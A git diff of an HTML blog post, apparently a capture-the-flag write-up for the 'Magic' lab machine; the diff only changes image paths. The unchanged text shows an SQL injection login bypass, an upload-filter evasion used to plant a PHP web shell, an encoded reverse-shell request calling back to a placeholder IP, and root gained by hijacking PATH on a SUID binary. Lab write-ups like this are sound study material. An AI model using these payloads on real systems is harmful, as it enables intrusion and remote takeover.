@@ -110,7 +110,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 <span style="color:#75715e"># Nmap done at Sun May 31 22:18:05 2020 -- 1 IP address (1 host up) scanned in 12.20 seconds</span>
 </code></pre></div><p>It seems a very normal Linux machine, let’s go to see what can I find on port 80:
-<img src="posts/magic/static/index_site.png" width="50%" height="50%" align="center" class="center">
+<img src="static/index_site.png" width="50%" height="50%" align="center" class="center">
 After a dirbuster scanning looking for .php extension I found the following pages:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
 /images <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
@@ -123,15 +123,15 @@ After a dirbuster scanning looking for .php extension I found the following page
 Go to play a bit whit it!</p>
 <h3 id="--sqli-bypass--">—- SQLi bypass —-</h3>
 <p>For the test to an SQLi point, I like to see the application’s behavior through Burp, I try to understand if it is vulnerable.
-<img src="posts/magic/static/login_burp.png" width="60%" height="60%" align="center" class="center">
+<img src="static/login_burp.png" width="60%" height="60%" align="center" class="center">
 After some tests I found the easiest way to abuse the SQLi, modifying the post’s arguments as follow:</p>
 <pre><code>username=' -- -&amp;password=random
 </code></pre><p>Nice, now I am in front of an Upload form!
-<img src="posts/magic/static/upload.png" width="35%" height="35%" align="center" class="center"></p>
+<img src="static/upload.png" width="35%" height="35%" align="center" class="center"></p>
 <h3 id="--upload-with-magic--">—- Upload with magic —-</h3>
 <p>When I see an upload form I always rejoice, normally they give great emotions.</p>
 <p>This specific upload form initially it seemed to me insuperable, every tries to upload a malformed file to get a “web shell” were blocked whit the following popup:
-<img src="posts/magic/static/upload_error.png" width="45%" height="45%" align="center" class="center"></p>
+<img src="static/upload_error.png" width="45%" height="45%" align="center" class="center"></p>
 <p>The security logic behind the form always checked:</p>
 <ul>
 <li>The final extension (allowed: png, jpg, jpeg)</li>
@@ -152,7 +152,7 @@ After some tests I found the easiest way to abuse the SQLi, modifying the post�
 <li>Make the following GET request to the image to retrieve a revershell:</li>
 </ul>
 <pre><code>http://10.10.10.185/images/uploads/image.php.jpeg?e=php+-r+%27$sock%3dfsockopen(%22MY-IP%22,MY-PORT)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%2
-</code></pre><img src="posts/magic/static/first_shell.png" width="45%" height="45%" align="center" class="center">
+</code></pre><img src="static/first_shell.png" width="45%" height="45%" align="center" class="center">
 <h3 id="--search-for-interesting-info--">—- Search for interesting info —-</h3>
 <p>On the machine, I’m able to see only another user, &ldquo;theseus&rdquo;.
 After some minutes to look around in the machine&rsquo;s filesystem I found the credentials that the application uses to interact with the database.</p>
@@ -178,10 +178,10 @@ In this way I can simply login to the machine through the following command:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh theseus@10.10.10.185
 </code></pre></div><p>At this point, I spent some time around the machine to try to find a miss configuration or something that allow me to become root.
 At the end of my research, I found an interesting non-standard SUID thanks to the following python script. (<a href="https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py">LINK</a>)</p>
-<img src="posts/magic/static/sui_enum.png" width="45%" height="45%" align="center" class="center">
+<img src="static/sui_enum.png" width="45%" height="45%" align="center" class="center">
 <p>A non-standard SUID could be a possible attack vector, I need more information about /bin/sysinfo</p>
 <p>A good way that I thought to see if and which executables are called by /bin/sysinfo it’s to use the &ldquo;strings&rdquo; command on it.</p>
-<img src="posts/magic/static/sysinfo.png" width="45%" height="45%" align="center" class="center">
+<img src="static/sysinfo.png" width="45%" height="45%" align="center" class="center">
 In the red box, I can see three different commands that are executed by /bin/sysinfo. NICE, IT’S TIME TO CREATE A FAKE EXECUTABLE!
 <h3 id="--privilege-escalation-using-path-variable--">—- Privilege Escalation Using PATH Variable —-</h3>
 <p>All the technical details for this type of attack are linked <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">here</a>.</p>
@@ -197,7 +197,7 @@ In the red box, I can see three different commands that are executed by /bin/sys
 $ export PATH<span style="color:#f92672">=</span>/tmp:$PATH
 $ /bin/sysinfo
 </code></pre></div><p>I have just to open a listening port before run /bin/sysinfo and a new root shell will spawn to me!</p>
-<img src="posts/magic/static/root.png" width="45%" height="45%" align="center" class="center">
+<img src="static/root.png" width="45%" height="45%" align="center" class="center">
 
     </div>
     <div class="post-footer">
